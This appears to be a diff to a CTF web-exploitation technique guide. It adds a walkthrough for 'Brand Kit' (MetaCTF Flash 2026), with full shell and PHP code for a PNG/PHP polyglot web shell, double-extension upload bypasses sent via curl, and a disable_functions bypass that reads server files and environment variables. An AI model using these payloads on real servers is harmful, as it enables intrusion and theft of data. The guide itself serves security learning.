@@ -34,6 +34,7 @@
 - [PHP7 OPcache Binary Webshell + LD_PRELOAD disable_functions Bypass (ALICTF 2016)](#php7-opcache-binary-webshell--ld_preload-disable_functions-bypass-alictf-2016)
 - [Wget GET Parameter Filename Trick for PHP Shell Upload (SECUINSIDE 2016)](#wget-get-parameter-filename-trick-for-php-shell-upload-secuinside-2016)
 - [Tar Filename Command Injection (CyberSecurityRumble 2016)](#tar-filename-command-injection-cybersecurityrumble-2016)
+- [PNG/PHP Polyglot Upload + Double Extension + disable_functions Bypass (MetaCTF Flash 2026)](#pngphp-polyglot-upload--double-extension--disable_functions-bypass-metactf-flash-2026)
 - [Pickle Chaining via STOP Opcode Stripping (VolgaCTF 2013)](#pickle-chaining-via-stop-opcode-stripping-volgactf-2013) *(stub — see [server-side-deser.md](server-side-deser.md))*
 - [Java Deserialization (ysoserial)](#java-deserialization-ysoserial) *(stub — see [server-side-deser.md](server-side-deser.md))*
 - [Python Pickle Deserialization](#python-pickle-deserialization) *(stub — see [server-side-deser.md](server-side-deser.md))*
@@ -592,6 +593,90 @@ tar cf exploit.tar *
 ```
 
 **Key insight:** When server-side scripts process filenames from user-uploaded archives (tar, zip) via shell commands, special characters in filenames become injection vectors. The semicolon breaks out of the filename context, and `#` comments out trailing characters. Always sanitize filenames from untrusted archives before shell interpolation.
+
+---
+
+## PNG/PHP Polyglot Upload + Double Extension + disable_functions Bypass (MetaCTF Flash 2026)
+
+**Pattern (Brand Kit):** Upload filter rejects `.php` extension but accepts image uploads. nginx/PHP-FPM executes files ending in `.php` regardless of preceding extensions. `disable_functions` blocks all command execution functions, but filesystem functions remain available.
+
+**Step 1: Create PNG/PHP polyglot**
+```bash
+# Create a valid PNG that also contains PHP code after the IEND chunk
+# PHP interpreter ignores binary data before <?php
+cp valid_image.png polyglot.png.php
+
+# Append PHP payload after the PNG IEND marker
+cat >> polyglot.png.php << 'PAYLOAD'
+<?php
+// disable_functions blocks system/exec/passthru/shell_exec/popen/proc_open
+// Use filesystem functions instead
+$files = scandir('/');
+foreach ($files as $f) {
+    if (strpos($f, 'flag') !== false || strpos($f, 'ctf') !== false) {
+        echo "FOUND: $f\n";
+        echo file_get_contents("/$f");
+    }
+}
+// Fallback: list everything
+echo "\n--- Full listing ---\n";
+print_r($files);
+?>
+PAYLOAD
+```
+
+**Step 2: Upload with double extension**
+```bash
+# Filter checks extension — .png.php has .php at the end
+# Some filters only check first extension (.png) or reject exact match on .php
+curl -F 'file=@polyglot.png.php;type=image/png' http://target/upload
+
+# Alternative double extensions to try:
+# .png.php    .jpg.php    .gif.php
+# .png.phtml  .png.phar   .png.php5
+# .php.png (some filters check last extension, nginx checks .php anywhere)
+```
+
+**Step 3: Access and enumerate**
+```bash
+# The uploaded file is served by nginx which passes .php to PHP-FPM
+curl http://target/uploads/polyglot.png.php
+
+# If flag filename is randomized, first enumerate:
+# scandir('/') reveals: flag_a8f3c9d2e1.txt
+# Then read it with file_get_contents()
+```
+
+**Useful PHP functions when `disable_functions` blocks execution:**
+```php
+<?php
+// File discovery
+scandir('/');                          // List directory
+glob('/flag*');                        // Glob pattern match
+file_exists('/flag.txt');              // Check existence
+
+// File reading
+file_get_contents('/flag.txt');        // Read entire file
+readfile('/flag.txt');                 // Output file directly
+file('/flag.txt');                     // Read as array of lines
+fopen('/flag.txt', 'r');              // Stream-based read
+
+// Environment / info leaking
+phpinfo();                             // Full PHP config, env vars
+getenv('FLAG');                        // Environment variable
+get_defined_vars();                    // All variables in scope
+
+// If open_basedir is set, check what's allowed:
+ini_get('open_basedir');
+ini_get('disable_functions');
+?>
+```
+
+**Key insight:** Three layers work together: (1) PNG/PHP polyglot passes image validation because it starts with valid PNG magic bytes; (2) double extension `.png.php` bypasses filters that reject `.php` but passes nginx's location regex that matches `\.php$`; (3) when `disable_functions` blocks all command execution, `scandir()` + `file_get_contents()` remain available for directory listing and file reading. Always enumerate the filesystem first when `disable_functions` is in play -- the flag filename is often randomized.
+
+**When to recognize:** File upload challenge with image-only restrictions. Check `phpinfo()` output for `disable_functions` list. If all exec functions are blocked, pivot to pure PHP filesystem functions.
+
+**References:** MetaCTF Flash CTF 2026 "Brand Kit"
 
 ---
 
